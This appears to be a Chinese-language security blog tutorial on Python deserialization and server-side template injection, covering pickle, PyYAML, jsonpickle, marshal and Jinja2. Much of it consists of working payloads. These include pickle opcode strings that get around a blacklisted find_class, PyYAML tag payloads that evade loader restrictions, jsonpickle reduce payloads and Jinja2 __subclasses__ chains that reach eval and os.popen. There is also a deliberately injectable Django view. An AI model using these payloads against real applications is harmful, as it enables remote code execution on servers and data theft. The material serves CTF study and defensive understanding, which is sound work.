<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">date = <span class="string">b'c__main__\nTest\n)\x81}(V__setstate__\ncos\nsystem\nubVwhoami\nb.'</span></span><br><span class="line">pickletools.dis(date)</span><br><span class="line">pickle.loads(date)</span><br></pre></td></tr></tbody></table></figure>
<p>重写find_class()：不一定绝对安全</p>
<p>官方给出的安全反序列化是继承了pickle.Pickler类，并重载了find_class方法，父类原本的操作是把module导入sys.module缓存中（并未导入全局或局部作用域），然后getattr取值，所以重载该方法后即可对module和name进行限制，但find_class的限制仅仅是对该函数参数过滤，并没有hook __import__等函数，所以通过eval(‘<strong>import</strong>('xx')’)等即可绕过。</p>
<p>下面的例子来自于python官方文档，通过白名单来现在函数运行：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = {</span><br><span class="line">    <span class="string">'range'</span>,</span><br><span class="line">    <span class="string">'complex'</span>,</span><br><span class="line">    <span class="string">'set'</span>,</span><br><span class="line">    <span class="string">'frozenset'</span>,</span><br><span class="line">    <span class="string">'slice'</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></tbody></table></figure>
<p>而我们做题一般都是遇到使用黑名单来操作的</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = {<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'builtins'</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(</span><br><span class="line">            <span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">restricted_loads(<span class="string">b""</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>题目并没有过滤getattr，我们可以通过该方法来获取到builtins下的eval等危险函数，一个常规的思路就是getattar(builtins, ‘eval’)，利用之前类继承方式来执行代码即可（魔术函数）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b"cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntRp1\ncbuiltins\ngetattr\n(g1\nVeval\ntR(V__import__('os').system('whoami')\ntR."</span></span><br></pre></td></tr></tbody></table></figure>
<h4 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h4><p>yaml本身支持强制类型转化，强制转化为str类型就是!!str，五个功能强大的yaml标签，支持转化为指定的python模块，类，方法以及对象实例</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:module.cls	<span class="comment"># module.cls instance  # 能够直接执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>/apply:module.f	<span class="comment"># value of f(...)      # 能够直接执行命令 </span></span><br><span class="line">!!python/name:module.name	<span class="comment"># module.name          # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/module:package.module	<span class="comment"># package.module       # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>:module.cls	<span class="comment"># module.cls instance  # 需要特定条件才可以执行命令 </span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>PyYAML&lt;=5.1</strong></p>
<p>序列化数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load(data)  <span class="comment"># 加载单个YAML配置，作用是将yaml类型数据转化为python对象包括自定义的对象实例、字典、列表等类型数据</span></span><br><span class="line">load(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器有BaseLoader、SafeLoader</span></span><br><span class="line">load_all(data)  <span class="comment"># 加载多个YAML配置</span></span><br><span class="line">load_all(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器</span></span><br></pre></td></tr></tbody></table></figure>
<p>Loader就是用来指定加载器</p>
<p>1.BaseConstructor：最最基础的构造器，不支持强制类型转换<br>2.SafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改<br>3.Constructor：在 YAML 规范上新增了很多强制类型转换（5.1以下默认此加载器，很危险）</p>
<p>反序列化数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump(data)  <span class="comment"># 接收的参数就是python对象包括对象实例、字典、列表等类型数据</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>五个complex标签的利用</strong></p>
<p>!!python/object/apply</p>
<p>进入yaml模块源码yaml/constructor.py中，最终进入了find_python_name方法，通过__import__将模块导入进来。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">"!!python/object/apply:os.system [whoami]"</span>)  <span class="comment"># 命令的单双引号加不加都可以</span></span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  args: ["whoami"]</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>!!python/object/new</p>
<p>原理跟上面一样，最终进入了find_python_name方法，通过__import__将模块导入进来</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">"!!python/object/new:os.system [whoami]"</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">  args: ["whoami"]</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>!!python/object、!!python/module、!!python/name</p>
<p>这三个不能直接执行命令的标签，条件允许其实有其他办法，比如利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件。比如说同级目录下面有两个文件（同一个文件内用法同理）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yaml_test.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>另一个文件里面</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">yaml.load(<span class="string">"!!python/module:yaml_test"</span> )</span><br><span class="line"><span class="comment"># 下面两条exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对。会执行但是执行完会报错。</span></span><br><span class="line">yaml.load(<span class="string">"!!python/object:yaml_test.exp"</span> )</span><br><span class="line">yaml.load(<span class="string">"!!python/name:yaml_test.exp"</span> )</span><br></pre></td></tr></tbody></table></figure>
<p>当然!!python/object/new和!!python/object/apply也可以用这种方式实现利用，同理会执行但是执行完会报错。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.load(<span class="string">'!!python/object/apply:yaml_test.exp {}'</span> )</span><br><span class="line">yaml.load(<span class="string">'!!python/object/new:yaml_test.exp {}'</span> )</span><br></pre></td></tr></tbody></table></figure>
<p>如果不在同一目录下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── test_file.py</span><br><span class="line">└── uploads</span><br><span class="line">    └── yaml_test.py</span><br></pre></td></tr></tbody></table></figure>
<p>修改下payload，在文件名前加入目录名可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#经过测试只有modle标签可行</span></span><br><span class="line">yaml.load(<span class="string">"!!python/module:uploads.yaml_test"</span> )</span><br></pre></td></tr></tbody></table></figure>
<p>!!python/object/new和!!python/object/apply加个目录即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错</span></span><br><span class="line">yaml.load(<span class="string">'!!python/object/apply:uploads.exp {}'</span> )</span><br><span class="line">yaml.load(<span class="string">'!!python/object/new:uploads.exp {}'</span> )</span><br></pre></td></tr></tbody></table></figure>
<p><strong>PyYAML&gt;5.1</strong></p>
<p>这个版本中更新了一下方法，截止文章编写时PyYAML的最新版本为6，POC都可以使用</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">load(data) [works under certain conditions]</span><br><span class="line">load(data, Loader=Loader)</span><br><span class="line">load(data, Loader=UnsafeLoader)</span><br><span class="line">load(data, Loader=FullLoader)</span><br><span class="line">load_all(data) [works under certain condition]</span><br><span class="line">load_all(data, Loader=Loader)</span><br><span class="line">load_all(data, Loader=UnSafeLoader)</span><br><span class="line">load_all(data, Loader=FullLoader)</span><br><span class="line">full_load(data)</span><br><span class="line">full_load_all(data)</span><br><span class="line">unsafe_load(data)</span><br><span class="line">unsafe_load_all(data)</span><br></pre></td></tr></tbody></table></figure>

<p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.py:3: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https:</span><br></pre></td></tr></tbody></table></figure>
<p>针对不同的需要，选择不同的加载器，有以下几种加载器<br>1.BaseConstructor：仅加载最基本的YAML<br>2.SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load)<br>3.FullConstructor：加载的模块必须位于 sys.modules 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。<br>4.UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）<br>5.Constructor：等同于UnsafeConstructor</p>
<p>Fullloader加载模式的对漏洞利用的限制<br>如果不执行只是为了单纯导入模块，那么需要sys.modules字典中有我们的模块，否则报错</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python <span class="built_in">object</span></span><br><span class="line">module <span class="string">'subprocess'</span> <span class="keyword">is</span> <span class="keyword">not</span> imported</span><br></pre></td></tr></tbody></table></figure>
<p>如果要执行，那么sys.modules字典中要有利用模块，并且加载进来的 module.name 必须是一个类而不能是方法，否则就会报错</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python instance</span><br><span class="line">expected a <span class="keyword">class</span>, but found &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>说人话就是：不在能够自动通过__import__将模块导入进来，需要使用内置函数或魔术函数方式来使用</p>
<p>那我们直接构造</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tuple(map(eval, ["__import__('os').system('whoami')"]))</span></span><br><span class="line"><span class="comment"># 变为yaml就是payload_1</span></span><br><span class="line"><span class="comment"># payload_1</span></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/new:tuple</span></span><br><span class="line"><span class="string">- !!python/object/new:map</span></span><br><span class="line"><span class="string">  - !!python/name:eval</span></span><br><span class="line"><span class="string">  - ["__import__('os').system('whoami')"]</span></span><br><span class="line"><span class="string">"""</span>,Loader=yaml.Loader)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span></span><br><span class="line"><span class="comment"># payload_2</span></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]</span></span><br><span class="line"><span class="string">  listitems: "__import__('os').system('whoami')"</span></span><br><span class="line"><span class="string">"""</span>,Loader=yaml.Loader)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 报错但是执行了</span></span><br><span class="line"><span class="comment"># payload_3</span></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">- !!python/object/new:str</span></span><br><span class="line"><span class="string">    args: []</span></span><br><span class="line"><span class="string">    state: !!python/tuple</span></span><br><span class="line"><span class="string">    - "__import__('os').system('whoami')"</span></span><br><span class="line"><span class="string">    - !!python/object/new:staticmethod</span></span><br><span class="line"><span class="string">      args: [0]</span></span><br><span class="line"><span class="string">      state:</span></span><br><span class="line"><span class="string">        update: !!python/name:exec</span></span><br><span class="line"><span class="string">"""</span>,Loader=yaml.Loader)</span><br><span class="line"><span class="comment"># payload_4</span></span><br><span class="line">yaml.load(<span class="string">"""</span></span><br><span class="line"><span class="string">- !!python/object/new:yaml.MappingNode</span></span><br><span class="line"><span class="string">  listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]'</span></span><br><span class="line"><span class="string">  state:</span></span><br><span class="line"><span class="string">    tag: !!str dummy</span></span><br><span class="line"><span class="string">    value: !!str dummy</span></span><br><span class="line"><span class="string">    extend: !!python/name:yaml.unsafe_load</span></span><br><span class="line"><span class="string">"""</span>,Loader=yaml.Loader)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>Jsonpickle</strong></p>
<p>用于将任意对象序列化为JSON的Python库。Jsonpickle可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">'os'</span>).system, (<span class="string">'whoami'</span>,))</span><br><span class="line">poc = jsonpickle.encode(EXP())  <span class="comment"># 把实例化的类转换成json数据</span></span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></tbody></table></figure>
<p>然后直接调用decode()函数来执行即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsonpickle.decode(<span class="string">"""{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["whoami"]}]}"""</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>Marshal</strong></p>
<p>由于pickle不能序列化code对象，所以在python2.6后新增marshal来处理code对象的序列化。</p>
<p>这个包没办法直接执行命令，需要多方函数配合，有点鸡肋</p>
<p>如果直接dumps一个函数后然后再loads是没办法执行的，而是需要用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))  <span class="comment"># 到这边都没发执行</span></span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, <span class="built_in">globals</span>(), <span class="string">''</span>)()  <span class="comment"># 动态构造后才可以执行</span></span><br></pre></td></tr></tbody></table></figure>
<p>如果需要执行需要配合pickle.loads()函数，和opcode打组合拳来实现<br><strong>Shelve</strong><br>类似序列化一个函数一个定位的坐标，然后反序列化的时候加载这个坐标然后执行代码，必须要文件中有的代码才可以执行。相关的函数shelve.open()<br><strong>SSTI</strong><br>SSTI 就是服务器端模板注入（Server-Side Template Injection）漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>推荐一个项目：<a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9naXRodWIuY29tL2VwaW5uYS90cGxtYXA=">https://github.com/epinna/tplmap</a><br><strong>Jinja2</strong><br>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了块，只要使用到这个包的代码只要不注意处理都会照成漏洞，下面一django来举例</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment"># http://127.0.0.1:9999/api/test/?name={{11*10}}</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">request</span>):</span><br><span class="line">    name = request.GET[<span class="string">"name"</span>]</span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(t.render())</span><br><span class="line">    <span class="comment"># 注入修复</span></span><br><span class="line">    <span class="comment"># t = Template("Hello {{n}}")</span></span><br><span class="line">    <span class="comment"># return t.render(n=name)</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/2.8s33kjoc3u.jpg" alt="Alt pic"><br>然后我们可以利用之前上面所写的魔术方法方法来注入即可达成</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2和python3通用代码</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">	<span class="keyword">if</span> c.__name__==<span class="string">'_IterationGuard'</span>:</span><br><span class="line">		c.__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>换成模板注入就是</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">{% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %}</span><br><span class="line">{% <span class="keyword">if</span> c.__name__==<span class="string">'_IterationGuard'</span> %}</span><br><span class="line">{{ c.__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>) }}</span><br><span class="line">{% endif %}</span><br><span class="line">{% endfor %}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/3.9dcr6uisek.jpg" alt="Alt pic"><br>或者换成__globals__模块来是用</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">{<span class="comment"># python2和python3通用代码 #}</span></span><br><span class="line">{% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %}</span><br><span class="line">{% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %}</span><br><span class="line">  {% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %}</span><br><span class="line">  {% <span class="keyword">if</span> b.__class__ == {}.__class__ %}</span><br><span class="line">    {% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %}</span><br><span class="line">      {{ b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("whoami").read()'</span>) }}</span><br><span class="line">    {% endif %}</span><br><span class="line">  {% endif %}</span><br><span class="line">  {% endfor %}</span><br><span class="line">{% endif %}</span><br><span class="line">{% endfor %}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="" data-lazy-src="https://w0xking.github.io/picx-images-hosting/python/4.6ik3123ln2.jpg" alt="Alt pic"><br><strong>Tornado</strong></p>
<p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过进行传递变量和执行简单的表达式。</p>
